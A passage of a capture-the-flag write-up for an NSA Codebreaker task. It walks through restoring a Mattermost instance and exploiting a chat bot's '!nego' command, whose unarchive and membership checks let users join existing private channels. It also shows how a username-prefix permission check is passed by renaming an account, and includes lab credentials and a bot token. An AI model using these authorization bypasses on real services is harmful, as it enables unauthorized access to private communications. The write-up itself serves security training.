## Task 6 - Crossing the Channel - (Vulnerability Research)

> This high visibility investigation has garnered a lot of agency attention. Due to your success, your team has designated you as the lead for the tasks ahead. Partnering with CNO and CYBERCOM mission elements, you work with operations to collect the persistent data associated with the identified Mattermost instance. Our analysts inform us that it was obtained through a one-time opportunity and we must move quickly as this may hold the key to tracking down our adversary! We have managed to create an account but it only granted us access to one channel. The adversary doesn't appear to be in that channel.

> We will have to figure out how to get into the same channel as the adversary. If we can gain access to their communications, we may uncover further opportunity.

> You are tasked with gaining access to the same channel as the target. The only interface that you have is the chat interface in Mattermost!


> Downloads: Mattermost instance (volumes.tar.gz), User login (user.txt)

> Prompt: Submit a series of commands, one per line, given to the Mattermost server which will allow you to gain access to a channel with the adversary.

### Solve:

Unironically the longest part of this task was getting everything setup when I first went through it. 

#### Setup

We are given the login for a user, as well as a Mattermost instance. Firstly, we need to install Mattermost itself. I followed [these](https://docs.mattermost.com/deployment-guide/server/deploy-linux.html) instructions. All you need to do is the part where you install Mattermost server, you don't need anything else past that. You will have to tweak `/opt/mattermost/config/config.json` (assuming that's where you saved Mattermost to if you followed the instructions word for word) to point to the correct PostgreSQL server. 

The `volumes` directory was specifically running on PostgreSQL version 13, or at the very least wouldn't let me use any modern versions of PostgreSQL. To handle this, we'll just use a Docker container to run PostgreSQL version 13, and also copy over the same data that's in `volumes`. This can be done with the below command

```
docker run -d   --name codebreaker_pg   -p 5432:5432   -v ~/comps/nsa-codebreaker/nsa-codebreaker-2025/task6/volumes/db/var/lib/postgresql/data:/var/lib/postgresql/data   -e POSTGRES_HOST_AUTH_METHOD=trust   postgres:13
```

I named the container `codebreaker_pg`. Make sure that you correctly point to the content of the `postgresql/data` directory from volumes. For me, it was located at `~/comps/nsa-codebreaker/nsa-codebreaker-2025/task6/volumes/db/var/lib/postgresql/data`

Now, we can run the Mattermost server by running `/opt/mattermost/bin/mattermost`

#### Finally, we can start

The server should be running at `http://localhost:8065`

Navigating there lands us at a login screen

![image1](./images/task6img1.png)

Well, we can login with the contents of the `user.txt` file

```
decimalpiglet81:yvMhOrAZSTgtqnAx
```

Username `decimalpiglet81` and password `yvMhOrAZSTgtqnAx`

Navigating to the team `MalwareCentral`, as the challenge mentions, we can see that we only have access to one channel, which is `Public`

![image2](./images/task6img2.png)

It appears that this is some sort of public channel with some other bad actors in it, but again as the challenge mentions, the "advesary", whoever they are, is not in this channel

We can actually try to see who our target is by going into the PostgreSQL database and looking at the `users` table. 

To save your eyes (Mattermost has a lot of columns in the `users` table), it appears the user we are trying to get into a channel with is `admin_insecureapricots73`. They are the only user designated as an admin. So, how exactly do we go about doing that?

#### Robot Rock

It appears that the bad actors have some sort of custom bot, similar to a Discord bot

We can run it in the `volumes/bot` directory by running `bot.py`. You need to ensure that you have all the proper dependencies, as well as a correct `.env` file

```
BOT_TOKEN=7k49bgbcob83dkr1w69j916cmr
BOT_TEAM=malwarecentral
```

The `BOT_TOKEN` can be found in the Mattermost database in the `useraccesstokens` table

```sql
mattermost=# select * from useraccesstokens;
             id             |           token            |           userid           |   description    | isactive 
----------------------------+----------------------------+----------------------------+------------------+----------
 yaebn3n6ribqzph3qgthhf16pw | 7k49bgbcob83dkr1w69j916cmr | iyyjrrh6i7d37dkk5tg6wsupnw | Malbot API token | t
(1 row)
```

Now we can run the bot

![image3](./images/task6img3.png)

Looking at the code of the bot, which is all in Python, it appears that some commands can only be ran if your username begins with `mod_` or `admin_`, with the below example showing the commands you can run that are defined in a file named `plugin_admin.py`

```python
from mmpy_bot import Plugin
from mmpy_bot.scheduler import schedule
from loguru import logger
from malware_database import db
from mmpy_bot.function import listen_to
import subprocess

class AdminPlugin(Plugin):
    """
    A plugin to handle administration utilities
    """

    @listen_to("^!util df", allowed_users_glob=["mod_*","admin_*"])
    def df_cmd(self, message ):
        logger.info(f"AdminPlugin: running df")
        result = subprocess.run(["df", "-h", "-x", "tmpfs"],capture_output=True, text=True)
        self.driver.reply_to(message, f"{result.stdout}")

    @listen_to("^!util uptime$", allowed_users_glob=["mod_*","admin_*"])
    def uptime_cmd(self, message):
        logger.info("AdminPlugin: running uptime")
        result = subprocess.run(["uptime"], capture_output=True, text=True)
        self.driver.reply_to(message, f"{result.stdout}")

    @listen_to("^!util free$", allowed_users_glob=["mod_*","admin_*"])
    def free_cmd(self, message):
        logger.info("AdminPlugin: running free -h")
        result = subprocess.run(["free", "-h"], capture_output=True, text=True)
        self.driver.reply_to(message, f"{result.stdout}")
```

Due to this, I rename our username to `mod_decimalpiglet81`

Now, I can successfully run these commands

![image4](./images/task6img4.png)

It doesn't really look like this is going to get us anywhere though

After some more digging in the bot's code, we find a very interesting file named `plugin_sales.py` that defines some more commands

```python
from mmpy_bot_monkeypatch import *  # Ensure monkeypatch is applied before anything else
from mmpy_bot import Plugin, Message, listen_to
from malware_database import db
from loguru import logger

MALWARE_TYPES = ["0click", "1click", "LPE", "SBE", "RCE", "Phishing", "ExploitKit", "Backdoor", "Rootkit"]
OS_TYPES = ["Windows", "Linux", "macOS", "Android", "iOS", "Unix"]
ODAYS = ["0day", "nday"]

class SalesPlugin(Plugin):
    """
    A plugin to handle sales in Mattermost.
    """

    @listen_to('^!nego (.*)$', no_direct=True,human_description="!nego channel seller moderator1 moderator2\n\tCreate a negotiation channel to close a deal!")
    def handle_nego(self : Plugin, message: Message, *args):
        logger.debug(f"handle_nego called with message: {message.text}")
        args = message.text.strip().split()
        if len(args) != 5:
            self.driver.reply_to(message, "Usage: !nego channel seller moderator1 moderator2")
            logger.warning("handle_nego: Incorrect number of arguments")
            return
        user1 = message.sender_name
        _, channel_name, user2, user3, user4 = args[:6]
        if not user4.startswith('mod_'):
            self.driver.reply_to(message, f"You must have a mod")
            return
        display_name = channel_name
        team_name = self.driver.options.get('team', 'malwarecentral')
        print(f"[DEBUG] Looking up team: {team_name}")
        # Get team info
        team = self.driver.teams.get_team_by_name(team_name)
        logger.debug(f"Team API response: {team}")
        team_id = team.get('id') if isinstance(team, dict) else team.json().get('id')
        print(f"[DEBUG] team_id: {team_id}")
        # Create channel
        channel_options = {
            "team_id": team_id,
            "name": channel_name,
            "display_name": display_name,
            "type": "P"
        }
        logger.debug(f"Creating channel with options: {channel_options}")
        try:
            channel = self.driver.channels.create_channel(channel_options)
            print(f"[DEBUG] Channel API response: {channel}")
        #hide weird exception when we have an archived channel with the same name, we'll just unarchive it
        except Exception as e:
            print(f"[DEBUG] Exception while creating channel: {e}")
            # Try to unarchive the channel if it exists
            try:
                archived_channel = self.driver.channels.get_channel_by_name(channel_name, team_id)
                if archived_channel and archived_channel.get('delete_at') > 0:
                    logger.info(f"Unarchiving existing channel: {archived_channel}")
                    self.driver.channels.unarchive_channel(archived_channel.get('id'))
                    channel = archived_channel
            except Exception as e:
                self.driver.reply_to(message, f"Failed to create or unarchive channel: {e}")
        #we either created a new channel or unarchived an existing one
        print(f"[DEBUG] getting channel: {channel_name} in team {team_id}")
        channel = self.driver.channels.get_channel_by_name(team_id, channel_name)
        channel_id = channel.get('id') if isinstance(channel, dict) else channel.json().get('id')
        print(f"[DEBUG] channel_id: {channel_id}")
        # Get user ids
        user_ids = []
        for uname in [user1, user2, user3, user4]:
            logger.debug(f"Looking up user: {uname}")
            user = self.driver.users.get_user_by_username(uname)
            logger.debug(f"User API response: {user}")
            uid = user.get('id') if isinstance(user, dict) else user.json().get('id')
            logger.debug(f"user_id for {uname}: {uid}")
            if not uid:
                self.driver.reply_to(message, f"User not found: {uname}")
                logger.warning(f"handle_nego: User not found: {uname}")
                return
            user_ids.append(uid)
        if len(set(user_ids)) != 4:
            logger.warning(f"incorrect number of users to run command")
            self.driver.reply_to(message, f"incorrect number of users to run command")
            return
        print(f"[DEBUG] All user_ids: {user_ids}")

        # Check if channel already has members
        existing_members = self.driver.channels.get_channel_members(channel_id)
        existing_member_user_ids = [member.get('user_id') for member in existing_members]
        existing_user_ids = any(uid in user_ids for uid in existing_member_user_ids)
        if existing_user_ids:
            # If the channel already has members, we should not add them again
            # This is a safeguard against creating duplicate entries in an archived channel
            print(f"[DEBUG] Existing members in channel {channel_id}: {existing_member_user_ids}, this shouldn't happen! archived channels should be empty")
            return
        # make sure not adding randos
        current_members_ids = [m['user_id'] for m in self.driver.channels.get_channel_members(message.channel_id)]
        if not (user_ids[0] in current_members_ids and user_ids[1] in current_members_ids and
                user_ids[2] in current_members_ids and user_ids[3] in current_members_ids):
            self.driver.reply_to(message, f"Could not find users")
            return

        # Add users to channel
        for uid in user_ids:
            logger.debug(f"Adding user {uid} to channel {channel_id}")
            self.driver.channels.add_channel_member(channel_id, {"user_id": uid})
        self.driver.reply_to(message, f"Created channel '{display_name}' and added users: {user1}, {user2}, {user3}")
        logger.info(f"Created channel '{display_name}' and added users: {user1}, {user2}, {user3}")

    @listen_to('^!add_offering (.*)$', no_direct=True,allowed_users_glob=["mod_*"], human_description="!add_offering name type os oday_or_nday creator price\n\tAdd a new malware offering.")
    def add_offering_cmd(self, message: Message, *args):
        args = message.text.strip().split()
        logger.debug(f"add_offering_cmd called with args: {args}")
        if len(args) != 7:
            self.driver.reply_to(message, "Usage: !add_offering name type os oday_or_nday creator price")
            logger.warning("add_offering: Incorrect number of arguments")
            return
        _, name, mtype, osys, oday_nday, creator, price = args
        mtype_lc = mtype.lower()
        osys_lc = osys.lower()
        oday_nday_lc = oday_nday.lower()
        logger.debug(f"Normalized values: type={mtype_lc}, os={osys_lc}, oday_nday={oday_nday_lc}")
        if mtype_lc not in [t.lower() for t in MALWARE_TYPES]:
            self.driver.reply_to(message, f"Invalid malware type. Allowed: {', '.join(MALWARE_TYPES)}")
            logger.warning(f"add_offering: Invalid malware type '{mtype}'")
            return
        if osys_lc not in [o.lower() for o in OS_TYPES]:
            self.driver.reply_to(message, f"Invalid OS. Allowed: {', '.join(OS_TYPES)}")
            logger.warning(f"add_offering: Invalid OS '{osys}'")
            return
        if oday_nday_lc not in [d.lower() for d in ODAYS]:
            self.driver.reply_to(message, "oday_or_nday must be '0day' or 'nday'.")
            logger.warning(f"add_offering: Invalid oday_or_nday '{oday_nday}'")
            return
        team_name = self.driver.options.get('team', 'malwarecentral')
        team = self.driver.teams.get_team_by_name(team_name)
        team_id = team.get('id') if isinstance(team, dict) else team.json().get('id')
        user = self.driver.users.get_user_by_username(creator)
        if not user or (user.get('id') if isinstance(user, dict) else user.json().get('id')) is None:
            self.driver.reply_to(message, f"Creator '{creator}' is not a valid user in the team.")
            logger.warning(f"add_offering: Creator '{creator}' is not a valid user in the team.")
            return
        try:
            price_val = float(price)
            if price_val < 0:
                raise ValueError
        except ValueError:
            self.driver.reply_to(message, "Price must be a positive number.")
            logger.warning(f"add_offering: Invalid price '{price}'")
            return
        offering = {
            'name': name,
            'type': mtype_lc,
            'os': osys_lc,
            'oday_or_nday': oday_nday_lc,
            'creator': creator,
            'price': price_val
        }
        logger.info(f"Adding offering: {offering}")
        oid = db.add_offering(offering)
        self.driver.reply_to(message, f"Offering added with ID {oid}.")
        logger.info(f"Offering added with ID {oid}")

    @listen_to('^!get_offerings (.*)$', no_direct=True, human_description="!get_offerings\n\tList all malware offerings.")
    def get_offerings_cmd(self, message: Message, *args):
        logger.debug(f"get_offerings_cmd called with message: {message.text}")
        offerings = db.get_offerings()
        logger.debug(f"Offerings retrieved: {offerings}")
        if not offerings:
            self.driver.reply_to(message, "No offerings available.")
            logger.info("get_offerings_cmd: No offerings available.")
            return
        msg = "Malware Offerings:\n" + "\n".join([
            f"ID: {o['id']}, Name: {o['name']}, Type: {o['type']}, OS: {o['os']}, Oday/Nday: {o['oday_or_nday']}, Creator: {o['creator']}, Price: {o['price']}"
            for o in offerings
        ])
        self.driver.reply_to(message, msg)
        logger.info("get_offerings_cmd: Sent offerings list.")

    #TODO update these users to be other admins we expect to be listed within the team
    @listen_to('^!record_sale (.*)$', no_direct=True, allowed_users_glob=["mod_*"],human_description="!record_sale buyer price offering_id\n\tRecord a sale of malware.",allowed_users=["badguy","otherbadguy","some guys","user1"])
    def record_sale_cmd(self, message: Message, *args):
        logger.debug(f"record_sale_cmd called with message: {message.text}")
        args = message.text.strip().split()
        if len(args) != 4:
            self.driver.reply_to(message, "Usage: !record_sale buyer price offering_id")
            logger.warning("record_sale_cmd: Incorrect number of arguments")
            return
        _, buyer, price, offering_id = args
        # Validate buyer is a user in the team
        team_name = self.driver.options.get('team', 'malwarecentral')
        team = self.driver.teams.get_team_by_name(team_name)
        team_id = team.get('id') if isinstance(team, dict) else team.json().get('id')
        user = self.driver.users.get_user_by_username(buyer)
        if not user or (user.get('id') if isinstance(user, dict) else user.json().get('id')) is None:
            self.driver.reply_to(message, f"Buyer '{buyer}' is not a valid user in the team.")
            logger.warning(f"record_sale_cmd: Buyer '{buyer}' is not a valid user in the team.")
            return
        # Seller is the creator of the offering
        offerings = db.get_offerings()
        offering = next((o for o in offerings if str(o['id']) == offering_id), None)
        if not offering:
            self.driver.reply_to(message, f"Offering ID {offering_id} not found.")
            logger.warning(f"record_sale_cmd: Offering ID {offering_id} not found.")
            return
        seller = offering['creator']
        sale = {
            'buyer': buyer,
            'seller': seller,
            'price': price,
            'offering_id': offering_id
        }
        logger.info(f"Recording sale: {sale}")
        db.record_sale(sale)
        self.driver.reply_to(message, f"Sale recorded for offering ID {offering_id}.")
        logger.info(f"Sale recorded for offering ID {offering_id}")
```

Specifically, the `!nego` command is what's really interesting

```python
@listen_to('^!nego (.*)$', no_direct=True,human_description="!nego channel seller moderator1 moderator2\n\tCreate a negotiation channel to close a deal!")
    def handle_nego(self : Plugin, message: Message, *args):
        logger.debug(f"handle_nego called with message: {message.text}")
        args = message.text.strip().split()
        if len(args) != 5:
            self.driver.reply_to(message, "Usage: !nego channel seller moderator1 moderator2")
            logger.warning("handle_nego: Incorrect number of arguments")
            return
        user1 = message.sender_name
        _, channel_name, user2, user3, user4 = args[:6]
        if not user4.startswith('mod_'):
            self.driver.reply_to(message, f"You must have a mod")
            return
        display_name = channel_name
        team_name = self.driver.options.get('team', 'malwarecentral')
        print(f"[DEBUG] Looking up team: {team_name}")
        # Get team info
        team = self.driver.teams.get_team_by_name(team_name)
        logger.debug(f"Team API response: {team}")
        team_id = team.get('id') if isinstance(team, dict) else team.json().get('id')
        print(f"[DEBUG] team_id: {team_id}")
        # Create channel
        channel_options = {
            "team_id": team_id,
            "name": channel_name,
            "display_name": display_name,
            "type": "P"
        }
        logger.debug(f"Creating channel with options: {channel_options}")
        try:
            channel = self.driver.channels.create_channel(channel_options)
            print(f"[DEBUG] Channel API response: {channel}")
        #hide weird exception when we have an archived channel with the same name, we'll just unarchive it
        except Exception as e:
            print(f"[DEBUG] Exception while creating channel: {e}")
            # Try to unarchive the channel if it exists
            try:
                archived_channel = self.driver.channels.get_channel_by_name(channel_name, team_id)
                if archived_channel and archived_channel.get('delete_at') > 0:
                    logger.info(f"Unarchiving existing channel: {archived_channel}")
                    self.driver.channels.unarchive_channel(archived_channel.get('id'))
                    channel = archived_channel
            except Exception as e:
                self.driver.reply_to(message, f"Failed to create or unarchive channel: {e}")
        #we either created a new channel or unarchived an existing one
        print(f"[DEBUG] getting channel: {channel_name} in team {team_id}")
        channel = self.driver.channels.get_channel_by_name(team_id, channel_name)
        channel_id = channel.get('id') if isinstance(channel, dict) else channel.json().get('id')
        print(f"[DEBUG] channel_id: {channel_id}")
        # Get user ids
        user_ids = []
        for uname in [user1, user2, user3, user4]:
            logger.debug(f"Looking up user: {uname}")
            user = self.driver.users.get_user_by_username(uname)
            logger.debug(f"User API response: {user}")
            uid = user.get('id') if isinstance(user, dict) else user.json().get('id')
            logger.debug(f"user_id for {uname}: {uid}")
            if not uid:
                self.driver.reply_to(message, f"User not found: {uname}")
                logger.warning(f"handle_nego: User not found: {uname}")
                return
            user_ids.append(uid)
        if len(set(user_ids)) != 4:
            logger.warning(f"incorrect number of users to run command")
            self.driver.reply_to(message, f"incorrect number of users to run command")
            return
        print(f"[DEBUG] All user_ids: {user_ids}")

        # Check if channel already has members
        existing_members = self.driver.channels.get_channel_members(channel_id)
        existing_member_user_ids = [member.get('user_id') for member in existing_members]
        existing_user_ids = any(uid in user_ids for uid in existing_member_user_ids)
        if existing_user_ids:
            # If the channel already has members, we should not add them again
            # This is a safeguard against creating duplicate entries in an archived channel
            print(f"[DEBUG] Existing members in channel {channel_id}: {existing_member_user_ids}, this shouldn't happen! archived channels should be empty")
            return
        # make sure not adding randos
        current_members_ids = [m['user_id'] for m in self.driver.channels.get_channel_members(message.channel_id)]
        if not (user_ids[0] in current_members_ids and user_ids[1] in current_members_ids and
                user_ids[2] in current_members_ids and user_ids[3] in current_members_ids):
            self.driver.reply_to(message, f"Could not find users")
            return

        # Add users to channel
        for uid in user_ids:
            logger.debug(f"Adding user {uid} to channel {channel_id}")
            self.driver.channels.add_channel_member(channel_id, {"user_id": uid})
        self.driver.reply_to(message, f"Created channel '{display_name}' and added users: {user1}, {user2}, {user3}")
        logger.info(f"Created channel '{display_name}' and added users: {user1}, {user2}, {user3}")
```

This creates a channel, consisting of you, a seller user, another user, with the last user required to be a mod. 

```python
user1 = message.sender_name
_, channel_name, user2, user3, user4 = args[:6]
if not user4.startswith('mod_'):
    self.driver.reply_to(message, f"You must have a mod")
    return
```

However if we look at this code, it appears to be able to add users to archived channels, or in other words, channels that already exist. However, if the channel already exists and *isn't* archived (still active), it doesn't care and fetches the channel anyway

```python
except Exception as e:
            print(f"[DEBUG] Exception while creating channel: {e}")
            # Try to unarchive the channel if it exists
            try:
                archived_channel = self.driver.channels.get_channel_by_name(channel_name, team_id)
                if archived_channel and archived_channel.get('delete_at') > 0:
                    logger.info(f"Unarchiving existing channel: {archived_channel}")
                    self.driver.channels.unarchive_channel(archived_channel.get('id'))
                    channel = archived_channel
            except Exception as e:
                self.driver.reply_to(message, f"Failed to create or unarchive channel: {e}")
        #we either created a new channel or unarchived an existing one
        print(f"[DEBUG] getting channel: {channel_name} in team {team_id}")
        channel = self.driver.channels.get_channel_by_name(team_id, channel_name)
        channel_id = channel.get('id') if isinstance(channel, dict) else channel.json().get('id')
        print(f"[DEBUG] channel_id: {channel_id}")
```

This appears to be a pretty big flaw. That means that we can add users and ourselves to any channel, not just non-existent or archived channels. 

The only requirement to do so is that the 3 users you try to run the `!nego` command with (the 2 users and the mod) cannot be in the channel you are trying to add everyone to. 

```python
existing_members = self.driver.channels.get_channel_members(channel_id)
existing_member_user_ids = [member.get('user_id') for member in existing_members]
existing_user_ids = any(uid in user_ids for uid in existing_member_user_ids)
if existing_user_ids:
    # If the channel already has members, we should not add them again
    print(f"[DEBUG] Existing members in channel {channel_id}: {existing_member_user_ids}, this shouldn't happen! archived channels should be empty")
    return
```

This appears to be another flaw! It seems that the intent was that if a channel isn't empty it shouldn't add any users at all, but it appears that just as long as all users you want to add aren't in the target channel, it'll work and add everyone to it. 

This `!nego` command seems to be our method of traversing channels. Beginning from the `Public` channel, we have to find 3 users in the current channel (with 1 of them being a mod) who are not in the target channel we want to get to, run the `!nego` command to gain access to that channel, and then continuously do this until we reach a channel that has `admin_insecureapricots73` in it. 

We can write a Python script that can automate doing this. Firstly though, we need a list of all users and their user IDs, as well as a list of every channel and the users within said channels. 

We can do this through some SQL commands:

We can get the user IDs of all users in each channel by running this query on every channel

```sql
mattermost=# SELECT u.username, u.id AS user_id
FROM channels c
JOIN channelmembers cm ON cm.channelid = c.id
JOIN users u ON u.id = cm.userid
WHERE c.displayname = 'Public';
      username       |          user_id           
---------------------+----------------------------
 enragedcaviar56     | 1w36wtpq4tfhiqe7xdm6igx84o
 grumpyrhino73       | bh87wmq4qfdmdbafhohpy6mq6h
 sadchowder88        | cw41xr7ydfnsjdfwqr9a7agtxr
 selfishjaguar50     | dzkurn8put8udqwrij98u4s94w
 chicteal95          | g4tp7dewfjgziph3exxjzbrhwy
 malbot              | iyyjrrh6i7d37dkk5tg6wsupnw
 euphoricraisins54   | o91awst7w3fidn58ry4cp3r4xh
 mod_decimalpiglet81 | rwagbspan7rxppfgrxjbcz4ore
 mod_needyboa0       | tosbendf6idnpc7egyw5wfau9h
(9 rows)
```

We can find all the channel display names by just running `SELECT displayname FROM channels;`

To get all users and their IDs, we can just run 

```sql
SELECT id, username FROM public.users;
```
Now we can start making that Python script

#### Actually Crossing the Channel

Our script below performs a BFS like traversal to try to move from one channel to another until it reaches one that contains the `admin_insecureapricots73` user, whose user ID is `rnqpjyd5mtnszfgpzkjguu18zo`, starting of course from the `Public` channel

```python
# Found from database
users = {
    "6k4nf8umejr7zfqfityfhtn9tw": "mod_lyingdoves52",
    "h64obyji93n75dcwwy4xfarcno": "mod_mercifulsausage42",
    "5tohie4px3nmipga8maq7koqny": "mod_amazedcamel5",
    "tosbendf6idnpc7egyw5wfau9h": "mod_needyboa0",
    "rnqpjyd5mtnszfgpzkjguu18zo": "admin_insecureapricots73",
    "bh87wmq4qfdmdbafhohpy6mq6h": "grumpyrhino73",
    "g4tp7dewfjgziph3exxjzbrhwy": "chicteal95",
    "1w36wtpq4tfhiqe7xdm6igx84o": "enragedcaviar56",
    "tdzdyadzhfdt3nqto9dan3xtia": "mod_excitedburritos53",
    "1xk1z5t3b3ggzeg4xrq3dyiyky": "needypup16",
    "o91awst7w3fidn58ry4cp3r4xh": "euphoricraisins54",
    "cw41xr7ydfnsjdfwqr9a7agtxr": "sadchowder88",
    "w5zjeekxpjfa3kzpzpw4mmzp1y": "sorecamel84",
    "hbo689966irppefi37oafo3tca": "wingedmandrill37",
    "iyyjrrh6i7d37dkk5tg6wsupnw": "malbot",
    "dzkurn8put8udqwrij98u4s94w": "selfishjaguar50",
    "w5sps8fbc7n1jk8bt88fkxs3ee": "mod_gloomyhyena90",
    "hypxe7jik7bjx881onw9of1nbe": "ardentpup59",
    "7exwwxmzfjgoxqtswc14b8qz6h": "system-bot",
    "rwagbspan7rxppfgrxjbcz4ore": "mod_decimalpiglet81",
}

# Found from database
channels = {

    "public" : ["rwagbspan7rxppfgrxjbcz4ore", "g4tp7dewfjgziph3exxjzbrhwy","1w36wtpq4tfhiqe7xdm6igx84o", 
    "tosbendf6idnpc7egyw5wfau9h", "o91awst7w3fidn58ry4cp3r4xh", "bh87wmq4qfdmdbafhohpy6mq6h", "iyyjrrh6i7d37dkk5tg6wsupnw",
    "cw41xr7ydfnsjdfwqr9a7agtxr", "dzkurn8put8udqwrij98u4s94w"],

    "channel15511" : ['1xk1z5t3b3ggzeg4xrq3dyiyky', 'bh87wmq4qfdmdbafhohpy6mq6h', 
    '1w36wtpq4tfhiqe7xdm6igx84o', 'g4tp7dewfjgziph3exxjzbrhwy', '5tohie4px3nmipga8maq7koqny', 
    '6k4nf8umejr7zfqfityfhtn9tw', 'dzkurn8put8udqwrij98u4s94w', 'h64obyji93n75dcwwy4xfarcno', 
    'hbo689966irppefi37oafo3tca', 'hypxe7jik7bjx881onw9of1nbe', 'tdzdyadzhfdt3nqto9dan3xtia', 
    'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'w5zjeekxpjfa3kzpzpw4mmzp1y', 
    'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel17991" : ['o91awst7w3fidn58ry4cp3r4xh', 'w5zjeekxpjfa3kzpzpw4mmzp1y', '1w36wtpq4tfhiqe7xdm6igx84o', 
    '1xk1z5t3b3ggzeg4xrq3dyiyky', '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 
    'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 'tdzdyadzhfdt3nqto9dan3xtia', 
    'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'bh87wmq4qfdmdbafhohpy6mq6h', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel28200" : ['bh87wmq4qfdmdbafhohpy6mq6h', 'o91awst7w3fidn58ry4cp3r4xh', '5tohie4px3nmipga8maq7koqny', 
    'cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 'h64obyji93n75dcwwy4xfarcno', 'hypxe7jik7bjx881onw9of1nbe', 
    'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'w5zjeekxpjfa3kzpzpw4mmzp1y', 
    'hbo689966irppefi37oafo3tca', '1xk1z5t3b3ggzeg4xrq3dyiyky', '6k4nf8umejr7zfqfityfhtn9tw', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel29721" : ['o91awst7w3fidn58ry4cp3r4xh', '1w36wtpq4tfhiqe7xdm6igx84o', 
    'h64obyji93n75dcwwy4xfarcno', '1xk1z5t3b3ggzeg4xrq3dyiyky', '5tohie4px3nmipga8maq7koqny', 
    '6k4nf8umejr7zfqfityfhtn9tw', 'tdzdyadzhfdt3nqto9dan3xtia', 'cw41xr7ydfnsjdfwqr9a7agtxr', 
    'dzkurn8put8udqwrij98u4s94w', 'g4tp7dewfjgziph3exxjzbrhwy', 'hypxe7jik7bjx881onw9of1nbe', 
    'bh87wmq4qfdmdbafhohpy6mq6h', 'tosbendf6idnpc7egyw5wfau9h', 'w5zjeekxpjfa3kzpzpw4mmzp1y', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel33529" : ['bh87wmq4qfdmdbafhohpy6mq6h', 'o91awst7w3fidn58ry4cp3r4xh', 
    'g4tp7dewfjgziph3exxjzbrhwy', 'h64obyji93n75dcwwy4xfarcno', 'tosbendf6idnpc7egyw5wfau9h', 
    'w5zjeekxpjfa3kzpzpw4mmzp1y', 'hbo689966irppefi37oafo3tca', 'hypxe7jik7bjx881onw9of1nbe', 
    'tdzdyadzhfdt3nqto9dan3xtia', 'w5sps8fbc7n1jk8bt88fkxs3ee', '1w36wtpq4tfhiqe7xdm6igx84o', '1xk1z5t3b3ggzeg4xrq3dyiyky', 
    '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel33768" : ['g4tp7dewfjgziph3exxjzbrhwy', '6k4nf8umejr7zfqfityfhtn9tw', '1w36wtpq4tfhiqe7xdm6igx84o', '1xk1z5t3b3ggzeg4xrq3dyiyky', 
    '5tohie4px3nmipga8maq7koqny', 'cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 'h64obyji93n75dcwwy4xfarcno', 
    'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 'w5zjeekxpjfa3kzpzpw4mmzp1y', 
    'bh87wmq4qfdmdbafhohpy6mq6h', 'rnqpjyd5mtnszfgpzkjguu18zo', 'iyyjrrh6i7d37dkk5tg6wsupnw', 'o91awst7w3fidn58ry4cp3r4xh'],

    "channel35869" : ['bh87wmq4qfdmdbafhohpy6mq6h', 'o91awst7w3fidn58ry4cp3r4xh', '1w36wtpq4tfhiqe7xdm6igx84o', 
    '1xk1z5t3b3ggzeg4xrq3dyiyky', '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 
    'dzkurn8put8udqwrij98u4s94w', 'h64obyji93n75dcwwy4xfarcno', 'hbo689966irppefi37oafo3tca', 'hypxe7jik7bjx881onw9of1nbe', 
    'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel40085" : ['o91awst7w3fidn58ry4cp3r4xh', '1w36wtpq4tfhiqe7xdm6igx84o', '1xk1z5t3b3ggzeg4xrq3dyiyky', 
    '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 'dzkurn8put8udqwrij98u4s94w', 
    'g4tp7dewfjgziph3exxjzbrhwy', 'hbo689966irppefi37oafo3tca', 'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 
    'w5sps8fbc7n1jk8bt88fkxs3ee', 'w5zjeekxpjfa3kzpzpw4mmzp1y', 'bh87wmq4qfdmdbafhohpy6mq6h', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel41385" : ['o91awst7w3fidn58ry4cp3r4xh', 'bh87wmq4qfdmdbafhohpy6mq6h', '1w36wtpq4tfhiqe7xdm6igx84o', 
    '1xk1z5t3b3ggzeg4xrq3dyiyky', '5tohie4px3nmipga8maq7koqny', '6k4nf8umejr7zfqfityfhtn9tw', 'g4tp7dewfjgziph3exxjzbrhwy', 
    'cw41xr7ydfnsjdfwqr9a7agtxr', 'h64obyji93n75dcwwy4xfarcno', 'hbo689966irppefi37oafo3tca', 'hypxe7jik7bjx881onw9of1nbe', 
    'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 'w5zjeekxpjfa3kzpzpw4mmzp1y', 'iyyjrrh6i7d37dkk5tg6wsupnw'],

    "channel48553" : ['bh87wmq4qfdmdbafhohpy6mq6h', 'tdzdyadzhfdt3nqto9dan3xtia', 'tosbendf6idnpc7egyw5wfau9h', 'w5sps8fbc7n1jk8bt88fkxs3ee', 
    'o91awst7w3fidn58ry4cp3r4xh', '1w36wtpq4tfhiqe7xdm6igx84o', '6k4nf8umejr7zfqfityfhtn9tw', 'cw41xr7ydfnsjdfwqr9a7agtxr', 
